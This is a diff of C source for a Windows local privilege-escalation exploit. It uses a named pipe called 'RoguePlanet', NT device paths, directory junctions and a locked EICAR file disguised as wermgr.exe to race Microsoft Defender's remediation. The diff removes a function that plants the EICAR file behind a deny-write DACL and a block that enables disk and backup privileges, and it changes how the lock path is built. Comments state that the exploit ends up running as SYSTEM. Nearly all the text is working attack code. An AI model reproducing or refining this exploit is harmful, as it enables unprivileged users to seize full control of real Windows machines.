@@ -78434,73 +78434,6 @@ bool CreateJunction(HANDLE hdir, wchar_t* target)
 	return true;
 }
 
-// Server variant: Try VHD mount first, then fall back to system device path
-// Place an EICAR file on the system volume for the lock-based timing primitive.
-// When using the system device path fallback (no ISO, no VHD), we need a file
-// at \Device\HarddiskVolumeN\RP_Temp\wermgr.exe that Defender will detect and
-// that we can lock for the race condition. The file is made read-only via DACL
-// to force Defender into the same remediation fallback as the ISO scenario.
-bool PrepareEicarOnDevice(wchar_t* devicepath)
-{
-	wchar_t tmpdir[MAX_PATH] = { 0 };
-	wsprintf(tmpdir, L"%s\\RP_Temp", devicepath);
-
-	UNICODE_STRING _tmpdir = { 0 };
-	RtlInitUnicodeString(&_tmpdir, tmpdir);
-	OBJECT_ATTRIBUTES tmpdirobjattr = { 0 };
-	InitializeObjectAttributes(&tmpdirobjattr, &_tmpdir, OBJ_CASE_INSENSITIVE, NULL, NULL);
-	IO_STATUS_BLOCK iosb = { 0 };
-	HANDLE htmp = NULL;
-	NTSTATUS stat = NtCreateFile(&htmp, GENERIC_READ | GENERIC_WRITE | DELETE | SYNCHRONIZE, &tmpdirobjattr, &iosb, NULL, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, FILE_CREATE, FILE_DIRECTORY_FILE, NULL, NULL);
-	if (stat)
-	{
-		printf("PrepareEicarOnDevice: Failed to create %ws, error: 0x%08X\n", tmpdir, stat);
-		return false;
-	}
-	CloseHandle(htmp);
-
-	// Write EICAR wermgr.exe to the device path
-	wchar_t eicar_devpath[MAX_PATH] = { 0 };
-	wsprintf(eicar_devpath, L"%s\\RP_Temp\\wermgr.exe", devicepath);
-
-	UNICODE_STRING _eicardevpath = { 0 };
-	RtlInitUnicodeString(&_eicardevpath, eicar_devpath);
-	OBJECT_ATTRIBUTES eicarobjattr = { 0 };
-	InitializeObjectAttributes(&eicarobjattr, &_eicardevpath, OBJ_CASE_INSENSITIVE, NULL, NULL);
-	HANDLE heicar = NULL;
-	iosb = { 0 };
-	stat = NtCreateFile(&heicar, GENERIC_READ | GENERIC_WRITE | SYNCHRONIZE, &eicarobjattr, &iosb, NULL, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, FILE_OVERWRITE_IF, NULL, NULL, NULL);
-	if (stat)
-	{
-		printf("PrepareEicarOnDevice: Failed to create eicar file: 0x%08X\n", stat);
-		return false;
-	}
-
-	DWORD written = 0;
-	WriteFile(heicar, EICAR_STRING, EICAR_SIZE, &written, NULL);
-
-	// Set the file read-only (denies DELETE/WRITE) so Defender can't clean it directly
-	// This replicates the ISO read-only behavior
-	SID_IDENTIFIER_AUTHORITY sia = SECURITY_WORLD_SID_AUTHORITY;
-	PSID pEveryoneSid = NULL;
-	AllocateAndInitializeSid(&sia, 1, SECURITY_WORLD_RID, 0, 0, 0, 0, 0, 0, 0, &pEveryoneSid);
-
-	DWORD aclSize = 256;
-	PACL pAcl = (PACL)malloc(aclSize);
-	InitializeAcl(pAcl, aclSize, ACL_REVISION);
-	AddAccessDeniedAce(pAcl, ACL_REVISION, GENERIC_WRITE | DELETE | FILE_WRITE_ATTRIBUTES, pEveryoneSid);
-	AddAccessAllowedAce(pAcl, ACL_REVISION, GENERIC_READ | GENERIC_EXECUTE | SYNCHRONIZE, pEveryoneSid);
-
-	// Apply DACL via handle — works with NT device paths
-	SetSecurityInfo(heicar, SE_FILE_OBJECT, DACL_SECURITY_INFORMATION, NULL, NULL, pAcl, NULL);
-	free(pAcl);
-	FreeSid(pEveryoneSid);
-	CloseHandle(heicar);
-
-	printf("PrepareEicarOnDevice: EICAR placed at %ws (read-only via DACL)\n", eicar_devpath);
-	return true;
-}
-
 bool MountVHD()
 {
     GUID uid = { 0 };
@@ -78911,21 +78844,6 @@ int main()
 
 	}
 
-	// Enable disk-related privileges before attempting mounts
-	// These are needed for OpenVirtualDisk/AttachVirtualDisk (ISO/VHD mount)
-	HANDLE hselftoken = NULL;
-	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hselftoken))
-	{
-		SetPrivilege(hselftoken, L"SeDiskSecurityPrivilege", TRUE);   // SeDiskSecurityPrivilege
-		SetPrivilege(hselftoken, SE_BACKUP_NAME, TRUE);          // SeBackupPrivilege
-		SetPrivilege(hselftoken, SE_RESTORE_NAME, TRUE);         // SeRestorePrivilege
-		SetPrivilege(hselftoken, SE_MANAGE_VOLUME_NAME, TRUE);   // SeManageVolumePrivilege
-		CloseHandle(hselftoken);
-	}
-	else
-	{
-		printf("Warning: Could not open process token for privilege escalation (error %d). Mounts may fail.\n", GetLastError());
-	}
 
 	HANDLE hpipe = CreateNamedPipe(L"\\\\.\\pipe\\RoguePlanet", PIPE_ACCESS_DUPLEX, PIPE_WAIT, PIPE_UNLIMITED_INSTANCES, NULL, NULL, NULL, NULL);
 	if (!hpipe || hpipe == INVALID_HANDLE_VALUE)
@@ -78942,17 +78860,11 @@ int main()
 		{
 			printf("VHD mount failed. Trying system device path...\n");
 			if (!GetSystemDevicePath())
-			{
-				printf("No device path available. Cannot continue.\n");
-				return 1;
+				{
+					printf("No device path available. Cannot continue.\n");
+					return 1;
+				}
 			}
-			// System device path: place EICAR file on the volume for the lock target
-			if (!PrepareEicarOnDevice(g_devicepath))
-			{
-				printf("Failed to prepare EICAR on system device. Cannot continue.\n");
-				return 1;
-			}
-		}
 	}
 	else
 	{
@@ -79129,12 +79041,14 @@ int main()
 	}
 
 	wchar_t lockpath[MAX_PATH] = { 0 };
-	// When using system device path, the EICAR file is at \Device\HarddiskVolumeN\RP_Temp\wermgr.exe
-	// When using ISO/VHD, it's at \Device\CdRom0\wermgr.exe or \Device\VHDxxx\wermgr.exe
-	if (!g_using_vhd && !hvirtdisk)
-		wsprintf(lockpath, L"%s\\RP_Temp\\wermgr.exe", mntpath);
-	else
-		wsprintf(lockpath, L"%s\\wermgr.exe", mntpath);
+	// The lock file must be accessible via the junction.
+	// In ISO/VHD mode: the junction makes maindirname -> mntpath, and
+	// mntpath\wermgr.exe is a real file on the read-only media.
+	// In system device mode: we can't write to the device root from a standard
+	// user, so the lock path is the EICAR in the temp dir (maindirname\wermgr.exe).
+	// After the junction, maindirname resolves through the junction, so
+	// maindirname\wermgr.exe IS mntpath\wermgr.exe — same file.
+	wsprintf(lockpath, L"%s\\wermgr.exe", maindirname);
 	HANDLE hlock1 = NULL;
 	UNICODE_STRING _lockpath = { 0 };
 	RtlInitUnicodeString(&_lockpath, lockpath);
@@ -79307,12 +79221,6 @@ int main()
 		DetachVirtualDisk(g_hvhd, DETACH_VIRTUAL_DISK_FLAG_NONE, NULL);
 		CloseHandle(g_hvhd);
 	}
-
-	// Clean up EICAR file from system volume if we placed one there
-	// Note: Win32 APIs don't accept \Device\ paths, so we skip cleanup here.
-	// The exploit is running as SYSTEM at this point, so the DACL-denied file
-	// can be cleaned up by a separate admin task if needed.
-	// The RP_Temp directory on the system volume is harmless post-exploit.
 
 	WaitForSingleObject(hthread, INFINITE);
 	CloseHandle(hthread);
